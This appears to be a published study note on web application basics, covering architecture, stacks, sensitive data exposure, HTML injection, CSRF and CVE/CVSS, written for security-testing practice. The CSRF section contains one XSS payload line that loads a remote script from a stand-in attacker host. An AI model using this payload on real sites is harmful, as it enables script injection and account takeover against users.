Tags: #Status/In-Progress #Type/Knowledge #Context/Web #publish-me

---
## Overview
Web applications are dynamic browser-based programs served over HTTP/HTTPS that combine front-end and back-end components to deliver interactive functionality. Unlike static websites (Web 1.0) that serve fixed content, web applications (Web 2.0) process user input, generate dynamic responses, and persist data. They run in any browser across any operating system, are updated server-side without client involvement, and are widely deployed — making them a high-value attack surface accessible to anyone on the internet. Common web application attack vectors include SQL injection, file upload abuse, unrestricted API access, broken access controls, and client-side scripting attacks.

---

## Terminology
| Term | Definition |
|------|------------|
| Front-End | Browser-rendered client-side interface built with HTML, CSS, and JavaScript |
| Back-End | Server-side logic that processes requests, queries databases, and returns responses |
| DOM (Document Object Model) | Browser's structured representation of an HTML page; manipulated by JavaScript |
| API Endpoint | URL on the server that handles specific requests from the client |
| Sensitive Data Exposure | When applications fail to protect sensitive information, often visible in page source |
| HTML Injection | Client-side attack where unsanitized user input is rendered as HTML on the page |
| Web 1.0 | Early generation of the web featuring static, read-only pages with no user interaction |
| Web 2.0 | Modern interactive web featuring dynamic content, user-generated data, and API-driven applications |
| CVE | Common Vulnerabilities and Exposures; standardized identifier for known security vulnerabilities |
| CVSS | Common Vulnerability Scoring System; 0–10 severity score assigned to vulnerabilities |
| Microservices | Architecture where an application is decomposed into small, independently deployable services |
| 3-Tier Architecture | Separates a web application into Presentation, Application, and Data layers |
| Technology Stack | Combined set of technologies used to build and run a web application (e.g., LAMP, WINS) |

---
## Core Concepts

[[Assets/Images/Pasted image 20250402154451.png|Request and Response]]

### Web Application Architecture

Web applications are built on layered infrastructure combining servers, databases, and networking components. Three classification models describe how these components are structured and related.

#### Infrastructure Models
| Model | Description | Notes |
|-------|-------------|-------|
| Client-Server | Client requests resources; server processes and responds | Standard model for most web apps |
| One Server | All components (web server, DB, app logic) on a single host | Simple but no fault tolerance |
| Many Servers — One Database | Multiple app servers share a centralized database | Segmentation and redundancy; DB is still a single point of failure |
| Many Servers — Many Databases | Fully distributed; each server has its own database | Best security and redundancy; most complex to manage |

#### Component Breakdown
Web applications consist of four layers of components:
1. **Client** — browser rendering front-end code
2. **Server** — web server, application logic, and database
3. **Services** — third-party integrations and microservices
4. **Functions** — serverless functions hosted on cloud platforms

#### 3-Tier Architecture
| Layer | Role |
|-------|------|
| Presentation | UI components — HTML, CSS, JavaScript rendered in the browser |
| Application | Business logic — validates requests, enforces rules, coordinates data access |
| Data | Persistence — database storage and retrieval |

#### Microservices
A microservices architecture decomposes a web application into small, independent services (e.g., registration, search, payments, ratings). Each service handles a single function, stores its own data, and communicates with other services via stateless APIs. Services can be written in different programming languages and scaled independently. This pattern is also called Service-Oriented Architecture (SOA).

#### Serverless
Serverless architectures abstract the server layer entirely. Developers deploy application logic as discrete functions to cloud providers (AWS Lambda, Azure Functions, Google Cloud Functions). The provider manages scaling, availability, and infrastructure — often using containerized environments internally.

---

### Front-End Technologies

#### HTML (HyperText Markup Language)
Defines the structure and content of a webpage.
[[Assets/Images/Pasted image 20250402154758.png|HTML Snippet]]

| Element | Purpose |
|---------|---------|
| DOCTYPE HTML | Declares HTML5 document type |
| html | Root element of the page |
| head | Contains metadata and page information |
| body | Contains all visible page content |
| h1 | Top-level heading |
| p | Paragraph text |

Common attributes:
- `img src` — specifies image source
- `p class` — applies a CSS class
- `p id` — assigns a unique identifier

**URL Encoding**
Special and unsafe characters in URLs are percent-encoded: replaced with `%` followed by two hex digits. Browsers decode these automatically. Common encodings: `%20` = space, `%3C` = `<`, `%3E` = `>`. Burp Suite's Decoder and online tools can encode/decode values during testing.

**DOM (Document Object Model)**
The DOM is the browser's structured representation of the HTML page. JavaScript interacts with it using standard references like `document.head`, `document.body`, or `document.getElementById()`. The DOM is defined in three parts:
- Core DOM — standard model for any document type
- XML DOM — extended model for XML documents
- HTML DOM — optimized model for HTML pages

#### CSS (Cascading Style Sheets)
- Controls visual presentation, layout, and styling of HTML elements
- Separates content (HTML) from design (CSS)
- Common CSS frameworks that speed development: Bootstrap, SASS, Foundation, Bulma, Pure

#### JavaScript (JS)
- Enables interactivity and dynamic content updates in the browser
- Can manipulate DOM elements in real time
- Server-side use via Node.js; front-end frameworks: Angular, React, Vue, jQuery
- See [[JavaScript Essentials]]

---

### Back-End Technologies

The back-end comprises all server-side components that process requests, store data, and generate responses.

#### Web Servers
Web servers handle incoming HTTP requests and route them to the appropriate application logic.

| Server | Market Share | Notes |
|--------|-------------|-------|
| Apache (httpd) | ~40% | Open-source; default on Linux; supports PHP, Python, Perl, .NET via modules (e.g., `mod_php`) |
| Nginx | ~30% | Async architecture; optimized for high concurrency with low CPU and memory overhead |
| IIS (Internet Information Services) | ~15% | Microsoft; runs on Windows Server; native Active Directory integration; supports .NET, PHP, FTP |

Other notable servers: Apache Tomcat (Java web applications), Node.js (server-side JavaScript).

#### Common Technology Stacks
| Stack | Components |
|-------|-----------|
| LAMP | Linux, Apache, MySQL, PHP |
| WAMP | Windows, Apache, MySQL, PHP |
| WINS | Windows, IIS, .NET, SQL Server |
| MAMP | macOS, Apache, MySQL, PHP |
| XAMPP | Cross-platform, Apache, MySQL, PHP/Perl |

#### Databases
Web applications use databases to store content, users, and application state. See [[SQL Fundamentals]] for full SQL/NoSQL coverage.

| Type | Examples |
|------|---------|
| Relational (SQL) | MySQL, MSSQL, Oracle, PostgreSQL, MariaDB |
| Non-Relational (NoSQL) | MongoDB, ElasticSearch, Apache Cassandra, Redis |

#### Development Frameworks
Frameworks provide scaffolding and structure to accelerate back-end development.

| Framework | Language | Notable Users |
|-----------|----------|--------------|
| Laravel | PHP | Startups and small-to-medium companies |
| Express | Node.js | PayPal, Yahoo, Uber, IBM |
| Django | Python | Google, YouTube, Instagram, Pinterest |
| Rails (Ruby on Rails) | Ruby | GitHub, Twitch, Airbnb |
| Spring | Java | Enterprise applications |
| ASP.NET | C# | Microsoft ecosystem, enterprise |

Large organizations typically use multiple frameworks rather than a single stack.

---

### Security Considerations

#### Sensitive Data Exposure
- Occurs when applications fail to protect sensitive information on the front-end
- Commonly visible in HTML source, JavaScript files, or API responses
- Access page source: right-click → View Page Source, `Ctrl+U`, or intercept in Burp Suite

Items to look for during recon:
- Hardcoded credentials or API keys
- Password hashes in HTML or JS responses
- Internal comments revealing application logic
- Hidden links, directories, or admin panels
- Exposed user data or PII in responses

Prevention: include only necessary code in front-end; obfuscate or minify JavaScript; review all source before deployment.

#### HTML Injection
[[Assets/Images/Pasted image 20250402160028.png|HTML Injection]]

- Occurs when unsanitized user input is rendered as HTML on the page
- Client-side attack targeting front-end rendering
- Can deface visible content or escalate into XSS when JavaScript is injectable
- Prevention: sanitize and encode all user input before rendering

#### Cross-Site Request Forgery (CSRF)
CSRF tricks an authenticated user's browser into making a forged request to a web application, performing unintended actions on their behalf. It commonly leverages [[XSS]] to automatically execute the forged request.

**Common scenario:** An attacker stores a script that changes the victim's password to a known value — when any authenticated user views the affected page, the password change fires silently.

Loading a remote exploit payload: `"><script src=//attacker.example.com/exploit.js></script>`

Prevention:
| Method | Description |
|--------|-------------|
| CSRF Tokens | Unique per-session tokens required for each state-changing request |
| SameSite Cookies | `SameSite=Strict` or `Lax` prevents cookies being sent on cross-origin requests |
| Re-authentication | Require password confirmation before sensitive operations |
| Input Sanitization | Remove special characters before storing or rendering user input |
| Input Validation | Verify submitted input matches expected format before processing |

Modern browsers implement partial CSRF defenses but server-side validation remains required.

---

### Public Vulnerabilities

Web applications often share codebases — a vulnerability in a popular platform (e.g., WordPress, Joomla, OpenCart) affects every installation running that version.

#### CVEs (Common Vulnerabilities and Exposures)
CVEs are standardized identifiers assigned to publicly known security vulnerabilities. Each entry documents the affected software, version range, and impact. Proof-of-concept (PoC) exploits are frequently published alongside CVEs.

Finding and using public CVEs:
1. Identify the version of the web application (source code, meta tags, repository headers, or error pages)
2. Search public exploit databases for matching CVEs — include plugins and third-party components
3. Prioritize CVEs with high CVSS scores (8–10) or those leading to Remote Code Execution; use lower-scoring CVEs when high-severity ones are not available

**Exploit Databases:**
- Exploit-DB (exploit-db.com)
- Rapid7 Vulnerability Database
- Vulnerability Lab

#### CVSS (Common Vulnerability Scoring System)
Open-source industry standard for rating vulnerability severity on a 0–10 scale.

| Score Range | Severity |
|-------------|---------|
| 0.0 | None |
| 0.1–3.9 | Low |
| 4.0–6.9 | Medium |
| 7.0–8.9 | High |
| 9.0–10.0 | Critical |

CVSS uses Base, Temporal, and Environmental metrics. The National Vulnerability Database (NVD) publishes base scores only — temporal and environmental scores vary by organization. CVSS v3.0 and v2.0 use different scoring formulas. Reference: https://www.first.org/cvss/user-guide

---
## Related Concepts
- [[HTTP & HTTPS]]
- [[DNS (Domain Name System)]]
- [[TLS & SSL]]
- [[JavaScript Essentials]]
- [[OWASP Top 10 - 2021]]
- [[SQL Fundamentals]]

## Related Techniques
- [[HTML Injection]]
- [[Sensitive Data Exposure]]
- [[XSS]]

## Related Tools
- [[Burp Suite]]
- [[Web Application Proxies]]

---
## References / Images
- [[Assets/Images/Pasted image 20250402154451.png|Request and Response]]
- [[Assets/Images/Pasted image 20250402154758.png|HTML Snippet]]
- [[Assets/Images/Pasted image 20250402160028.png|HTML Injection]]
- MDN Web Docs — HTML, CSS, JavaScript references
- OWASP Web Security Testing Guide: https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing
- CVSS User Guide: https://www.first.org/cvss/user-guide
